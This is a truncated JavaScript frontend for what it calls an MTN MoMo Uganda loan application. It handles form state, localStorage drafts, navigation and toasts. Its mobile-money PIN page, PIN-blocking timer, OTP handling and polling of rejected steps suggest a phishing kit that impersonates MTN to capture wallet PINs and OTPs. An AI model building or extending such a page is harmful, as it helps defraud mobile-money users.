// ============================================================
// MTN MoMo Uganda Loan Application – Frontend Logic
// ============================================================

const S = {
    loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
    firstName: '', lastName: '', phone: '', email: '',
    employment: '', annualIncome: 0,
    kinName: '', kinPhone: '',
    applicationId: '',
    isSubmitting: false,
    rejectedStep: null
};

let currentPollTimeout = null;
let otpResendTimer = null;
let otpResendCountdown = 0;
let pinBlockTimer = null;

// ─── localStorage Helpers ───
const STORAGE_KEYS = {
    APPLICATION_ID: 'mtn_uganda_application_id',
    APPLICATION_DATA: 'mtn_uganda_application_data',
    REJECTION_INFO: 'mtn_uganda_rejection_info',
    FORM_DRAFT: 'mtn_uganda_form_draft',
    OTP_TIMER: 'mtn_uganda_otp_timer'
};

function saveToLocalStorage(key, data) {
    try { localStorage.setItem(key, JSON.stringify(data)); }
    catch (error) { console.error(`❌ Failed to save ${key}:`, error); }
}

function getFromLocalStorage(key) {
    try {
        const data = localStorage.getItem(key);
        return data ? JSON.parse(data) : null;
    } catch (error) { return null; }
}

function removeFromLocalStorage(key) {
    try { localStorage.removeItem(key); } catch (_) {}
}

function saveApplicationId(id) {
    if (id) {
        S.applicationId = id;
        saveToLocalStorage(STORAGE_KEYS.APPLICATION_ID, { id, timestamp: new Date().toISOString() });
    }
}

function loadApplicationId() {
    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
    if (saved && saved.id) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            S.applicationId = saved.id;
            return saved.id;
        }
        removeFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
    }
    return null;
}

function saveApplicationData() {
    saveToLocalStorage(STORAGE_KEYS.APPLICATION_DATA, { ...S, timestamp: new Date().toISOString() });
}

function loadApplicationData() {
    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
    if (saved) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            ['loanType', 'loanAmount', 'loanTerm', 'loanPurpose', 'firstName', 'lastName', 'phone', 'email', 'employment', 'annualIncome', 'kinName', 'kinPhone', 'applicationId', 'rejectedStep'].forEach(f => {
                if (saved[f] !== undefined) S[f] = saved[f];
            });
            return true;
        }
        removeFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
    }
    return false;
}

function saveRejectionInfo(step, applicationId) {
    saveToLocalStorage(STORAGE_KEYS.REJECTION_INFO, { step, applicationId, timestamp: new Date().toISOString() });
}

function loadRejectionInfo() {
    const saved = getFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
    if (saved) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 5 * 60 * 1000) return saved;
        removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
    }
    return null;
}

function clearRejectionInfo() { removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO); }

function saveFormDraft() {
    saveToLocalStorage(STORAGE_KEYS.FORM_DRAFT, {
        firstName: document.getElementById('s2fi')?.value || '',
        lastName: document.getElementById('s2la')?.value || '',
        phone: document.getElementById('s2ph')?.value || '',
        email: document.getElementById('s2em')?.value || '',
        loanAmount: document.getElementById('s1am')?.value || '',
        loanPurpose: document.getElementById('s1pu')?.value || '',
        employment: document.getElementById('s3em')?.value || '',
        annualIncome: document.getElementById('s3in')?.value || '',
        kinName: document.getElementById('s3kn')?.value || '',
        kinPhone: document.getElementById('s3kp')?.value || '',
        timestamp: new Date().toISOString()
    });
}

function loadFormDraft() {
    const draft = getFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
    if (draft) {
        const age = Date.now() - new Date(draft.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            if (draft.firstName) document.getElementById('s2fi').value = draft.firstName;
            if (draft.lastName) document.getElementById('s2la').value = draft.lastName;
            if (draft.phone) document.getElementById('s2ph').value = draft.phone;
            if (draft.email) document.getElementById('s2em').value = draft.email;
            if (draft.loanAmount) document.getElementById('s1am').value = draft.loanAmount;
            if (draft.loanPurpose) document.getElementById('s1pu').value = draft.loanPurpose;
            if (draft.employment) document.getElementById('s3em').value = draft.employment;
            if (draft.annualIncome) document.getElementById('s3in').value = draft.annualIncome;
            if (draft.kinName) document.getElementById('s3kn').value = draft.kinName;
            if (draft.kinPhone) document.getElementById('s3kp').value = draft.kinPhone;
            return true;
        }
        removeFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
    }
    return false;
}

// ─── Navigation ───
function _goTo(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    const el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
}

function goTo(pageId) {
    _goTo(pageId);
    if (pageId === 'page-pin') { updatePinPageUI(); checkPinStatus(); }
}

function startApplication() {
    S.rejectedStep = null;
    clearRejectionInfo();
    if (!S.applicationId) {
        S.applicationId = 'TEMP-' + Date.now().toString().slice(-6);
    }
    ['s1Err', 's2Err', 's3Err', 'momErr', 'pinErr', 'otpErr'].forEach(id => clearErr(id));
    goTo('page-step1');
}

function showToast(message, type = 'info', duration = 3000) {
    const existing = document.querySelector('.toast');
    if (existing) existing.remove();
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    toast.textContent = message;
    document.body.appendChild(toast);
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = '
